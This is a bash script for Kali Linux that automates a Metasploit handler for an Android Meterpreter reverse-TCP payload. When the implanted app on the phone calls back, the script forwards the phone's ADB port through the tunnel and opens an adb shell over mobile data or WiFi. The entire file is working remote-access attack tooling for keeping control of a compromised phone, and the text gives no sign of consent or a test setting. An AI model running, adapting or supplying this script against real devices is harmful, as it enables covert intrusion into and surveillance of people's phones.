#!/bin/bash
# Reconnect ADB to phone via Meterpreter tunnel.
# Works on 4G/5G or WiFi — no USB required (unless phone rebooted since last adb tcpip 5555).
# Run this on Kali any time the session drops and the phone is reachable.

set -e

LHOST="0.0.0.0"
LPORT="443"
PAYLOAD="android/meterpreter_reverse_tcp"
LOG="/tmp/ps_msf.log"

# Check port 443 is free
if ss -tlnp | grep -q ":${LPORT}"; then
    echo "[-] Port ${LPORT} already in use:"
    ss -tlnp | grep ":${LPORT}"
    echo "    Kill whatever is holding it (apache2? existing msfconsole?) then retry."
    exit 1
fi

echo "[*] Writing RC files..."

cat > /tmp/ps_portfwd.rc << 'RCEOF'
portfwd add -l 5555 -p 5555 -r 127.0.0.1
background
RCEOF

cat > /tmp/handler.rc << RCEOF
use exploit/multi/handler
set PAYLOAD ${PAYLOAD}
set LHOST ${LHOST}
set LPORT ${LPORT}
set ExitOnSession false
set SessionsLimit 1
set AutoRunScript multi_console_command -r /tmp/ps_portfwd.rc
exploit -j -z
RCEOF

# Kill stale tmux session and clear log
tmux kill-session -t ps_reconnect 2>/dev/null || true
> "$LOG"

echo "[*] Starting msfconsole in tmux session 'ps_reconnect' (port ${LPORT})..."
tmux new-session -d -s ps_reconnect "msfconsole -q -r /tmp/handler.rc 2>&1 | tee ${LOG}"

echo "[*] Trigger the payload on the phone — open the app or just wait (it retries every ~15s)."
echo "[*] Polling localhost:5555 for up to 3 minutes..."
echo "    (Watch handler live: tmux attach -t ps_reconnect)"
echo ""

for i in $(seq 1 36); do
    if nc -z 127.0.0.1 5555 2>/dev/null; then
        echo ""
        echo "[+] Port 5555 is live — connecting ADB..."
        adb connect 127.0.0.1:5555
        echo ""
        echo "[+] Done! Use: adb -s 127.0.0.1:5555 shell"
        echo "    Keep the tmux session open or the tunnel drops."
        echo "    Reattach any time: tmux attach -t ps_reconnect"
        exit 0
    fi
    # Also check log for session opened (portfwd may take a moment)
    if grep -q "Meterpreter session" "$LOG" 2>/dev/null; then
        echo ""
        echo "[*] Session detected — portfwd should be running, polling :5555..."
    fi
    printf "    waiting... %d/36\r" $i
    sleep 5
done

echo ""
echo "[-] Timed out waiting for portfwd on :5555."
echo "    Attach to msfconsole: tmux attach -t ps_reconnect"
echo "    Then manually: sessions -i 1  then: portfwd add -l 5555 -p 5555 -r 127.0.0.1"
exit 1
